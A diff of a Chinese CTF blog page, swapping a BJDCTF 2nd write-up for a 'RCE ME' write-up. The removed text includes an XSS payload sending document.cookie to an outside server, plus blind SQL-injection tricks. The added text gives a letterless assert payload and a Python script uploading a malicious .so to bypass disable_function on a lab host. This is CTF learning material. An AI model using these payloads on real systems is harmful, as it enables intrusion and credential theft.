@@ -4,9 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="HBCTF 大美西安, Z3ratu1&#39;s blog">
-    <meta name="description" content="[BJDCTF 2nd]部分wp据说是萌新赛，就目前做的几个题来说的确较为简单
-fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打SSTI上一次的BJDCTF也考过，具体判断什么的可以看上次比赛的WP">
+    <meta name="keywords" content="极客大挑战 RCE ME, Z3ratu1&#39;s blog">
+    <meta name="description" content="极客大挑战 RCE ME三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍
+无字母数字命令执行&amp;lt;?php
+error_repo">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +15,7 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>HBCTF 大美西安 | Z3ratu1&#39;s blog</title>
+    <title>极客大挑战 RCE ME | Z3ratu1&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -286,13 +287,13 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf1.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        HBCTF 大美西安
+                        极客大挑战 RCE ME
                     </div>
                 </div>
             </div>
@@ -403,8 +404,12 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/wp/" target="_blank">
-                                <span class="chip bg-color">wp</span>
+                            <a href="/tags/RCE/" target="_blank">
+                                <span class="chip bg-color">RCE</span>
+                            </a>
+                        
+                            <a href="/tags/bypass-disable-function/" target="_blank">
+                                <span class="chip bg-color">bypass_disable_function</span>
                             </a>
                         
                     </div>
@@ -427,21 +432,21 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-04-23
+                    2020-07-11
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1k
+                        1.2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        3 Min
+                        5 Min
                     </div>
                     
                 
@@ -457,16 +462,51 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="BJDCTF-2nd-部分wp"><a href="#BJDCTF-2nd-部分wp" class="headerlink" title="[BJDCTF 2nd]部分wp"></a>[BJDCTF 2nd]部分wp</h1><p>据说是萌新赛，就目前做的几个题来说的确较为简单</p>
-<h2 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h2><p>SSTI，测一下可以发现用的jinja2，搜一个payload直接打<br>SSTI上一次的BJDCTF也考过，具体判断什么的可以看上次比赛的WP</p>
-<h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>ThinkPHP5，开了debug模式，随便触发一个错误看一眼thinkPHP版本，然后继续搜payload打</p>
-<h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>反弹shell，用了swp源码泄漏，过滤了重定向符&gt;，使得直接弹shell不行了，但是方法还是很多的，搜一下发现一个curl反弹的，在自己的机子上放一个文件里面写一个弹shell的语句就可以了<br><a href="https://www.cnblogs.com/-zhong/p/11398877.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/11398877.html</a></p>
-<p>师傅还提到一个用if语句类似盲注的方法可以把flag测出来</p>
-<h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>过滤了一大堆东西，<code>;=&#39;&quot;like select and &amp;&amp; or --</code>什么的都没了<br>说实话感觉很棘手，因为没有select就没法做绝大多数的注入了，而去掉了分号就没法堆叠注入，感觉一度陷入困境<br>但是今天又学习到了新知识，像<code>select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;</code>这种语句，我们可以username=\&amp;password=or sleep(5) #进行注入，<br>这样子原语句就变成了<code>select * from users where username=&#39;\&#39; and password=&#39;or sleep(5) # &#39;</code><br>这样子就有一个可以操控的注入点了<br>但是没有select仍然没法进行太多的操作，但是这里我们只需要获得一个password就可以了<br>发现or 后面的逻辑为true时是回显是BJD needs to be stronger，而为false时是xxx need girlfriend，就显然是一个盲注了<br>用<code>or ascii(substr(password,&amp;#37s,1))&lt;&amp;#37s #</code>这样子一句盲注就可以拿到密码，使用admin账户登录获得flag，这里注意substr不能从0开始，从1开始截取的才是第一位</p>
-<p>从这里开始后面的题都是比赛结束之后看的</p>
-<h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>不明所以的题名，还是个藏比，着实没意思<br>进去有登录框，登录admin会失败，剩下的随便登录，会回显登录的用户名，一开始想试ssti，或者注入，无果。<br>查看源码无果，扫描无果<br>最后看的wp，用burp抓包会在登录时有一个重定向，会告诉你一个隐藏的L0g1n.php （说实话感觉藏比题没意思）<br>进去之后是考http头的，萌新题，不过出现了两个没见过的http头<br>一个是要求你从localhost访问，但是不能用XFF，伪造remoteAddr显然不可能，所以找替代品Client-IP<br>要求使用Commodo 64的浏览器访问，查了半天还查不到是什么，最后看wp是一个叫Commodore 64的操作系统（为什么搜不到呢）<br>要求从某个邮箱访问：From<br>要求使用VPN：Via</p>
-<h2 id="element-master"><a href="#element-master" class="headerlink" title="element master"></a>element master</h2><p>藏，审查源码可以看到一个Po.php的ASCII码形式，访问之后得到一个点？？？？令人困惑<br>然后试着输入几个其他的化学元素，一开始使得H，O，之类的记得住的元素没反应，后来随手打了个Ar有反应了，发现靠后的元素会有其他的字符出现，随便写个脚本遍历元素周期表就可以了，得到一个PHP文件名，访问获得flag</p>
-<h2 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h2><p>又是藏，.git源码泄漏，用Githack拉下来，就给了一个<code>echo unserialize($a);</code>，那么思路就必然是原生类的反序列化了，稍微搜一下就你看见lemon神仙的一篇文章，exception类使用__toString的反序列化<br>刚好这个类可以xss，点题<br>但是我也不知道flag在哪啊，xss也不是很熟练，我知道的xss好像就盗cookie，那写一个payload把cookie发到自己服务器上就可以了<br>payload：<code>&lt;script&gt;document.write(&quot;&lt;img src=&#39;http://server:10004?c=&quot; + escape(document.cookie) + &quot;&#39;&gt;&quot;)&lt;/script&gt;</code></p>
+                <h1 id="极客大挑战-RCE-ME"><a href="#极客大挑战-RCE-ME" class="headerlink" title="极客大挑战 RCE ME"></a>极客大挑战 RCE ME</h1><p>三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function<br>当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍</p>
+<h2 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#91;</span><span class="token string">'code'</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#93;))&amp;#123</span>
+    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#91;</span><span class="token string">'code'</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#93;;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/&amp;#91;A-Za-z0-9&amp;#93;+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+<span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125</span>
+
+<span class="token comment" spellcheck="true">// ?></span></code></pre>
+<p>相比于SUCTF的命令执行简单了很多，直接使用取反~就能节约很多字符，也没有对使用字符种类的限制，可以直接构造简单的执行语句<br>var_dump(scandir(‘/‘));扫描目录发现根目录下有flag文件和readflag，直接读读不出来没权限，那么就是需要执行readflag了，但是从phpinfo里面可以看到禁止了能用的所有执行命令行的函数，但是有一个assert可以用，就构造一个assert($_GET&#91;_&#93;)进行命令执行，跳出长度限制，任意执行命令</p>
+<h3 id="可能的小坑"><a href="#可能的小坑" class="headerlink" title="可能的小坑"></a>可能的小坑</h3><p>这里的eval($code)和eval($_GET&amp;#91;code&#93;)是不一样的，前者如果我们想要code=$_GET&amp;#91;a&#93;;&amp;a=func()是不能执行函数的，后端只会获得一个a=func()的变量，只有当code=$_GET&amp;#91;a&#93;();&amp;a=func才行，变量名后面接括号将会被认为是一个<strong>可变函数</strong>，从而完成执行，PHP7允许可变函数带参数。但是我们这里再构造一层assert($_GET&#91;_&#93;)，就又跳了出来，回到了前者的情况，就能绕过判断进行任意命令执行了</p>
+<p>eval，echo等语句并不能以可变函数的形式被调用，因为他们是一个语言结构，在PHP7中，assert也变为了一个语言结构，具体可以看这篇文章<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html</a><br><a href="https://www.sohu.com/a/302465075_750628" target="_blank" rel="noopener">https://www.sohu.com/a/302465075_750628</a></p>
+<p>函数名需要用括号括一下，尤其是像上述var_dump这样还有函数嵌套的，括号要括对。<br>这里之前看别人的payload，他将美元符号$也通过取反编码传入，这样子的话后端只能获得一个内容为$_GET&#91;_&#93;的字符串，自然无法执行命令，而我们传入一个美元符号，后端自然会认为这个是一个变量进一步解析，就能实现一个$_GET的功能。</p>
+<p>到目前的payload： <code>?code=(~&amp;#379E&amp;#378C&amp;#378C&amp;#379A&amp;#378D&amp;#378B)($&amp;#123~&amp;#37A0&amp;#37B8&amp;#37BA&amp;#37AB&amp;#125&amp;#91;_&amp;#93;);</code> 即assert($_GET&#91;_&#93;)</p>
+<p>这里测试了一下用eval($_GET&#91;_&#93;)就不行，也不知道为什么，只能用assert</p>
+<h2 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h2><p>bypass disable_function已经是一个老生常谈了，通过LD_PRELOAD加载恶意.so动态链接库来进行劫持是一个常用方法，当然也不一定万用(以前还试过自己手动gcc编译一个动态链接库)，现在直接用GitHub现成项目就行，md里面也简要介绍了LD_PRELOAD是怎么绕过disable_function进行命令执行的<br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>还有一个json的，没怎么仔细看，顺手贴一下，只适用于php7<br><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
+<p>当然问题在于怎么上传，上次就是卡在这了，这把想直接构造后门蚁剑连一下也没成。<br>被迫学习了手搓文件上传，用$FILE这个超全局变量来获取上传的文件，通过move_uploaded_file上传函数文件，由于没有open_basedir，我们之间把文件写在稳定有访问权限的/tmp目录下最为稳妥(据说答题现场这个目录下一堆木马)，用python的request库post方法实现上传，然后执行命令包含/tmp下的php文件，并加载动态链接库即可绕过disable_function，执行readflag拿到flag了<br>贴一下脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://7506331a-390b-42ac-b51f-12ae0a6dc457.node3.buuoj.cn/?code=(~&amp;#379E&amp;#378C&amp;#378C&amp;#379A&amp;#378D&amp;#378B)($&amp;#123~&amp;#37A0&amp;#37B8&amp;#37BA&amp;#37AB&amp;#125&amp;#91;_&amp;#93;);&amp;_=move_uploaded_file($_FILES&amp;#91;'file'&amp;#93;&amp;#91;'tmp_name'&amp;#93;, '/tmp/z3ratu1.so');"</span>
+evil_so <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'bypass_disablefunc_x64.so'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
+evil_php <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'bypass_disablefunc.php'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
+
+
+files <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#91;('file', ('z3ratu1.so', evil_so))&amp;#93;</span>
+data <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123"upload": "Submit"&amp;#125</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+url <span class="token operator">=</span> <span class="token string">"http://7506331a-390b-42ac-b51f-12ae0a6dc457.node3.buuoj.cn/?code=(~&amp;#379E&amp;#378C&amp;#378C&amp;#379A&amp;#378D&amp;#378B)($&amp;#123~&amp;#37A0&amp;#37B8&amp;#37BA&amp;#37AB&amp;#125&amp;#91;_&amp;#93;);&amp;_=move_uploaded_file($_FILES&amp;#91;'file'&amp;#93;&amp;#91;'tmp_name'&amp;#93;, '/tmp/z3ratu1.php');"</span>
+
+files <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#91;('file', ('z3ratu1.php', evil_php, 'image/jpeg'))&amp;#93;</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>
+<p>一开始传半天传不上去，检查了好几遍，又是分号没写又是引号没加的，丢人</p>
 
             </div>
             <hr/>
@@ -625,9 +665,9 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《HBCTF 大美西安》
+                    《极客大挑战 RCE ME》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/04/23/%5BBJDCTF%202nd%5D%E9%83%A8%E5%88%86wp/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/07/11/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5D%20RCE%20ME/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -671,27 +711,26 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2020/05/06/%5BHITCON%202017%5DSSRFme/">
+                <a href="/2020/07/11/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/">
                     <div class="card-image">
                         
-                        <img src="/img/1.jpg" class="responsive-img" alt="HITCON 2017 SSRFme">
+                        <img src="/img/ctf1.jpg" class="responsive-img" alt="2019&#93;枯燥的抽奖">
                         
-                        <span class="card-title">HITCON 2017 SSRFme</span>
+                        <span class="card-title">2019&#93;枯燥的抽奖</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            [HITCON 2017]SSRFmebuu上的一个老题，又是不会做看wp的一天
-给了源码
+                            &#91;GWCTF 2019&#93;枯燥的抽奖伪随机数安全的一个题，通过php_mt_rand这个工具逆向出随机数种子，然后通过种子获取字符串
+贴一下源码
 &lt;?php
-    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &amp;#123
-      
+header("Content-Type: text/html
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-05-06
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-11
                         </span>
                         <span class="publish-author">
                             
@@ -708,8 +747,8 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/wp/" target="_blank">
-                        <span class="chip bg-color">wp</span>
+                    <a href="/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" target="_blank">
+                        <span class="chip bg-color">伪随机数</span>
                     </a>
                     
                 </div>
@@ -723,24 +762,24 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/03/23/%5BGWCTF%202019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/">
+                <a href="/2020/07/11/%5BSWPU2019%5DWeb4/">
                     <div class="card-image">
                         
-                        <img src="/img/ctf1.jpg" class="responsive-img" alt="GWCTF 2019 你的名字">
+                        <img src="/img/php.jpg" class="responsive-img" alt="SWPU2019 Web4">
                         
-                        <span class="card-title">GWCTF 2019 你的名字</span>
+                        <span class="card-title">SWPU2019 Web4</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            &#91;GWCTF 2019&#93;你的名字模板注入，一开始就猜到了，然后出题人害人，过滤的字符串给了个PHP的报错，还给了一个不存在的文件，又把路由设置了一个index.php。。。。不是我看wp我绝对猜不出来发生了什么
-但是在一系列
+                            [SWPU2019]Web4buu上的一分题，说实话这个难度我是不相信它只有一分的
+题解打开是一个登录框，简单测试发现添加单引号会出现一个PHP的报错，而不是MySQL的报错，存在注入点，但不可使用报错注入测了半天，感觉有关键词屏蔽，但是无
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-23
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-11
                             </span>
                         <span class="publish-author">
                             
@@ -757,12 +796,12 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/wp/" target="_blank">
-                        <span class="chip bg-color">wp</span>
+                    <a href="/tags/SQLI/" target="_blank">
+                        <span class="chip bg-color">SQLI</span>
                     </a>
                     
-                    <a href="/tags/ssti/" target="_blank">
-                        <span class="chip bg-color">ssti</span>
+                    <a href="/tags/wp/" target="_blank">
+                        <span class="chip bg-color">wp</span>
                     </a>
                     
                 </div>
